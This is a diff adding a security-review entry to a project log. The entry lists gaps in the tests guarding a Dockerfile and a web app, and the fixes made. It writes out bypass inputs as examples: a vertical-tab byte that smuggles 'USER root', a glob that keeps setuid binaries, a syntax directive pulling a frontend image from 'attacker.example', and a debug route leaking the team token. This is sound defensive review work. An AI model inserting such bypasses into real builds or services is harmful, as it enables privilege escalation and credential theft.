@@ -504,3 +504,47 @@ Twentieth security review, one blocker and three majors:
 ● The sentence splitter cut at `e.g.`; abbreviations are shielded. A sentence introducing a table
   now pairs with the row carrying the number, when it ends in a colon.
 ● `register_cors` carried a parameter it never called.
+
+Twenty-first security review, one blocker, four majors and five minors, every one of them in the
+layer written to prove the application's boundaries hold rather than in a boundary itself:
+
+● BLOCKER: the round-twenty parser fix was reopened one byte to the side. `str.splitlines()`
+  breaks a line at VT, FF, 0x1c-0x1e, NEL and U+2028, and a blanket `rstrip()` also strips NBSP
+  and the Unicode spaces, where BuildKit splits on `\n` alone and trims `\r\n` alone. So
+  `LABEL org.opencontainers.image.title=pree\<0x0b>` above `USER root` was a continuation to
+  this parser and two complete instructions to docker: 292 tests green, shipped user root, and a
+  0x0b invisible in an editor and in a diff. The parser's line model is BuildKit's now, and ten
+  whitespace carriers plus three padded continuations and a CRLF file are asserted directly.
+● The opaque-character refusal omitted `*`, the most natural glob of the set:
+  `RUN cp /usr/b*n/true /usr/b*n/find` passed 292 of 292 and left every setuid and setgid bit in
+  the base image shipped. `/usr/b?n/find` was refused and `/usr/b*n/find` was not, the same
+  attack one metacharacter over. `*`, `{` and `}` are refused now, and the comment claiming the
+  refusal had a cost was wrong: a vetted RUN never reaches that loop.
+● The test added last round to prove that refusal works asserted only that its own four string
+  constants contained a refused character, a tautology over literals. Deleting the refusal
+  outright left 292 tests green. The guard is a callable helper now, fed synthetic Dockerfiles,
+  and thirteen fabrications turn it red.
+● The parser-directive guard checked a directive's NAME and never its VALUE, so
+  `# syntax=attacker.example/evil-frontend:latest` passed the whole suite. A syntax value is a
+  build frontend image: BuildKit pulls it, hands it this file and the whole build context, and it
+  may emit any image at all, which would make every assertion in the boot contract a statement
+  about a document nothing executes. The shipped `docker/dockerfile:1` was also a floating tag in
+  a file that pins its bases by digest. Nothing here needs a BuildKit-only feature, so the
+  directive is gone from the Dockerfile and every directive is refused.
+● Nothing walked the route table. `@app.post("/v1/debug")` returning the team token,
+  unauthenticated, passed 292 of 292 and did not trip the coverage floor: one line to send the
+  shared credential to any client on the internet with a green gate. Three tests now walk
+  `app.routes` - the gate by introspection, the gate by asking, and the token in no body or log
+  line - and the `Allow` expectation is derived from the table instead of a hand-written map over
+  five of the nine paths.
+● The claim-unit splitter raised `UnboundLocalError` on any document opening with a table row,
+  and its colon pairing reached a table row and nothing else, so a wrong token floor written as a
+  `●` bullet, a fenced block or a heading-then-row passed. The house style bullets with `●`,
+  which made the missed shape the likeliest one. The pairing crosses three units now and all four
+  shapes turn it red, with the splitter tested directly on synthetic documents.
+● `scripts/package-appstore.sh` wrote the archive before any check ran, so every refusal exited 1
+  with the rejected zip sitting at the path the script tells a human to upload. It stages to a
+  partial path and moves into place only after the last check. The script had no automated test
+  at all after six rounds of findings; it has three now.
+● Two comments in `src/pree/app.py` claimed an explicit operation id the code does not pass, and
+  two labelled different middleware layers "second-outermost".
